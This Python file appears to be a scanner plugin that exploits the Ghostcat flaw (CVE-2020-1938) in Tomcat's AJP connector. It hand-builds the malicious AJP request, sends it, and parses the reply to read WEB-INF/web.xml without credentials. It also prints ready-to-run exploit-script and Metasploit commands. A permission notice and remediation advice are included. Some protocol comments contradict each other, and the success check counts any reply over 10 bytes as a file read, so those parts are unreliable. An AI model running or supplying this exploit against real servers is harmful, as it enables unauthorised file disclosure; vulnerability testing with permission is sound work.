# plugins/ajp_plugin.py
# =====================================================================
# File: plugins/ajp_plugin.py
# Notes:
# - This file is part of the BlackPort project.
# - Tests AJP connector (port 8009) for Ghostcat (CVE-2020-1938).
# - Ghostcat allows unauthenticated file read from the Tomcat webapp.
# - We attempt to read WEB-INF/web.xml as proof of file read.
# - Affects ALL Tomcat versions < 9.0.31 / 8.5.51 / 7.0.100.
# - Use only on hosts/networks you own or have explicit permission to test.
# =====================================================================

from .plugin_base import PluginBase
import socket
import struct


class AJPPlugin(PluginBase):
    name = "AJP Ghostcat Check"
    applicable_services = ["AJP", "ajp13", "AJP13"]

    AJP_PORTS = {8009, 8010}

    # AJP magic bytes (client → server)
    AJP_MAGIC = b"\x12\x34"

    def run(self, target, port, banner=None):
        if port not in self.AJP_PORTS:
            return None

        notes        = []
        risk         = "MEDIUM"
        exploit_hint = None

        notes.append(
            f"Apache AJP connector detected on port {port}. "
            "AJP (Apache JServ Protocol) is enabled by default on all Tomcat versions."
        )

        result, file_content = self._probe_ghostcat(target, port)

        if result == "file_read":
            notes.append(
                "CRITICAL: CVE-2020-1938 (Ghostcat) CONFIRMED — "
                "unauthenticated file read via AJP connector. "
                "Read WEB-INF/web.xml without credentials."
            )
            if file_content:
                # Show first meaningful line of web.xml
                preview = self._extract_preview(file_content)
                if preview:
                    notes.append(f"web.xml preview: {preview}")
            risk = "CRITICAL"
            exploit_hint = (
                f"Read any webapp file: python ajp_ghostcat.py -p {port} {target} "
                f"--file /WEB-INF/web.xml "
                f"OR Metasploit: use auxiliary/admin/http/tomcat_ghostcat "
                f"set RHOSTS {target} set RPORT {port} run"
            )

        elif result == "ajp_responding":
            notes.append(
                "AJP connector responding — CVE-2020-1938 (Ghostcat) likely exploitable. "
                "All Tomcat < 9.0.31 / 8.5.51 / 7.0.100 are vulnerable. "
                "Allows unauthenticated read of any file in the webapp directory."
            )
            risk = "HIGH"
            exploit_hint = (
                f"Metasploit: use auxiliary/admin/http/tomcat_ghostcat "
                f"set RHOSTS {target} set RPORT {port} run"
            )

        notes.append(
            "Remediation: Disable AJP connector in conf/server.xml if not needed. "
            "If required, set 'secret' attribute and restrict to localhost. "
            "Upgrade to Tomcat >= 9.0.31 / 8.5.51 / 7.0.100."
        )

        return {
            "plugin":       self.name,
            "risk":         risk,
            "notes":        " | ".join(notes),
            "exploit_hint": exploit_hint,
        }

    def _pack_string(self, s):
        """
        AJP string encoding: 2-byte length (big-endian) + bytes + null terminator.
        Empty string = \xFF\xFF
        """
        if s is None:
            return b"\xff\xff"
        if isinstance(s, str):
            s = s.encode("utf-8")
        return struct.pack(">H", len(s)) + s + b"\x00"

    def _pack_int(self, n):
        """AJP integer: 2-byte big-endian."""
        return struct.pack(">H", n)

    def _build_ghostcat_request(self, target, filename="/WEB-INF/web.xml"):
        """
        Build AJP13_FORWARD_REQUEST for Ghostcat (CVE-2020-1938).

        The vulnerability: AJP lets the front-end set request attributes including
        javax.servlet.include.request_uri / path_info / servlet_path.
        Tomcat uses these to locate a file, bypassing normal URI checks.

        Packet structure:
          magic(2) + length(2) + prefix_code(1=0x02) + method(1) +
          protocol + req_uri + remote_addr + remote_host +
          server_name + server_port(2) + is_ssl(1) +
          num_headers(2) + headers +
          attributes + terminator(0xFF)

        Ghostcat attributes:
          0x01 = javax.servlet.include.request_uri  → "/"
          0x0B = javax.servlet.include.path_info    → target filename
          0x0C = javax.servlet.include.servlet_path → ""
        """
        body = b""

        # prefix_code = 2 (FORWARD_REQUEST)
        body += b"\x02"

        # method = 2 (GET)
        body += b"\x02"

        # protocol
        body += self._pack_string("HTTP/1.1")

        # req_uri — must be a valid path, we use /index.jsp as cover
        body += self._pack_string("/index.jsp")

        # remote_addr
        body += self._pack_string("127.0.0.1")

        # remote_host
        body += self._pack_string("localhost")

        # server_name
        body += self._pack_string(target)

        # server_port
        body += self._pack_int(8080)

        # is_ssl = false
        body += b"\x00"

        # num_headers = 1 (just Host)
        body += self._pack_int(1)

        # Header: Host (code 0xA00E)
        body += b"\xA0\x0E"
        body += self._pack_string(f"{target}:8080")

        # Ghostcat attributes — these are the exploit payload
        # Attribute 0x01: javax.servlet.include.request_uri = "/"
        body += b"\x01"
        body += self._pack_string("/")

        # Attribute 0x0B: javax.servlet.include.path_info = target file
        body += b"\x0B"
        body += self._pack_string(filename)

        # Attribute 0x0C: javax.servlet.include.servlet_path = ""
        body += b"\x0C"
        body += self._pack_string("")

        # Request terminator
        body += b"\xFF"

        # Prepend AJP packet header: magic(2) + length(2)
        packet = self.AJP_MAGIC + struct.pack(">H", len(body)) + body
        return packet

    def _probe_ghostcat(self, target, port, timeout=6):
        """
        Send Ghostcat AJP request and read the response.
        Returns ("file_read", content) or ("ajp_responding", None) or (None, None).
        """
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((target, port))

                packet = self._build_ghostcat_request(target)
                s.sendall(packet)

                # Read AJP response packets
                response_data = b""
                s.settimeout(4)
                try:
                    while True:
                        chunk = s.recv(4096)
                        if not chunk:
                            break
                        response_data += chunk
                        if len(response_data) > 65536:
                            break
                        # AJP end response marker: 0x41 0x42 + 0x00 0x02 + 0x05
                        if b"\x41\x42\x00\x02\x05" in response_data:
                            break
                except socket.timeout:
                    pass

                if not response_data:
                    return None, None

                # Check if we got an AJP response (magic 0x4142 = "AB")
                if response_data[:2] == b"\x41\x42":
                    # Extract body content from AJP response packets
                    content = self._extract_ajp_body(response_data)
                    if content and (
                        b"web-app" in content or
                        b"<?xml" in content or
                        b"servlet" in content or
                        b"display-name" in content
                    ):
                        return "file_read", content.decode(errors="ignore")
                    elif content and len(content) > 10:
                        return "file_read", content.decode(errors="ignore")
                    else:
                        return "ajp_responding", None

                # Any response at all = AJP is live
                if response_data:
                    return "ajp_responding", None

        except ConnectionRefusedError:
            return None, None
        except socket.timeout:
            return None, None
        except Exception:
            pass

        return None, None

    def _extract_ajp_body(self, data):
        """
        Parse AJP response packets and extract body content.

        AJP response packet types (from Tomcat → client):
          0x03 = SEND_HEADERS
          0x03 = SEND_BODY_CHUNK  (different packet type = 0x03, but code in body)
          0x04 = SEND_BODY_CHUNK
          0x05 = END_RESPONSE

        Packet format: AB(2) + length(2) + type(1) + payload
        """
        content = b""
        offset  = 0

        while offset < len(data) - 4:
            # Check for AJP magic
            if data[offset:offset+2] != b"\x41\x42":
                offset += 1
                continue

            if offset + 4 > len(data):
                break

            pkt_len  = struct.unpack(">H", data[offset+2:offset+4])[0]
            pkt_end  = offset + 4 + pkt_len
            if pkt_end > len(data):
                break

            pkt_body = data[offset+4:pkt_end]
            if not pkt_body:
                offset = pkt_end
                continue

            pkt_type = pkt_body[0]

            # Type 0x03 = SEND_BODY_CHUNK
            if pkt_type == 0x03 and len(pkt_body) >= 3:
                chunk_len = struct.unpack(">H", pkt_body[1:3])[0]
                if len(pkt_body) >= 3 + chunk_len:
                    content += pkt_body[3:3+chunk_len]

            # Type 0x04 = SEND_BODY_CHUNK (alternate)
            elif pkt_type == 0x04 and len(pkt_body) >= 3:
                chunk_len = struct.unpack(">H", pkt_body[1:3])[0]
                if len(pkt_body) >= 3 + chunk_len:
                    content += pkt_body[3:3+chunk_len]

            offset = pkt_end

        return content if content else None

    def _extract_preview(self, content):
        """Extract a short readable preview from web.xml content."""
        if not content:
            return None
        lines = [l.strip() for l in content.split("\n") if l.strip()]
        # Find the display-name or first meaningful tag
        for line in lines[:20]:
            if "display-name" in line or "description" in line:
                return line[:100]
        # Return first non-XML-declaration line
        for line in lines:
            if line and not line.startswith("<?") and not line.startswith("<!--"):
                return line[:100]
        return lines[0][:100] if lines else None
